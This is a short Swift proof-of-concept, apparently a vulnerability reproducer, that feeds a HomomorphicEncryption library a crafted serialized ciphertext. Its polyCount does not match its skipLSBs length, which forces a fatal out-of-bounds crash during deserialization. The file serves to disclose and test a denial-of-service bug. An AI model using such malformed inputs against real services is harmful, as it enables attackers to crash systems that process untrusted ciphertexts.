import Foundation
import HomomorphicEncryption

do {
    let params = try EncryptionParameters<UInt64>(from: .insecure_n_16_logq_60_logt_15)
    let context = try Context<Bfv<UInt64>>(encryptionParameters: params)

    // polyCount = 2 (Little Endian: 0x02, 0x00)
    // We provide 250 bytes of padding. The first poly needs ~120 bytes and will succeed.
    // This forces the loop to reach the 2nd iteration, where skipLSBs[1] will fatally crash.
    var fakePolysBuffer: [UInt8] = [0x02, 0x00]
    fakePolysBuffer.append(contentsOf: [UInt8](repeating: 0, count: 250))
    
    let maliciousSerialized = SerializedCiphertext<UInt64>.full(
        polys: fakePolysBuffer, 
        skipLSBs: [0], // Length is 1, but polyCount is 2. Triggers fatal crash on iteration 2.
        correctionFactor: 1
    )

    let _ = try Ciphertext<Bfv<UInt64>, Coeff>(
        deserialize: maliciousSerialized, 
        context: context
    )
    print("Unexpectedly succeeded")
} catch {
    print("Caught error: \(error)")
}
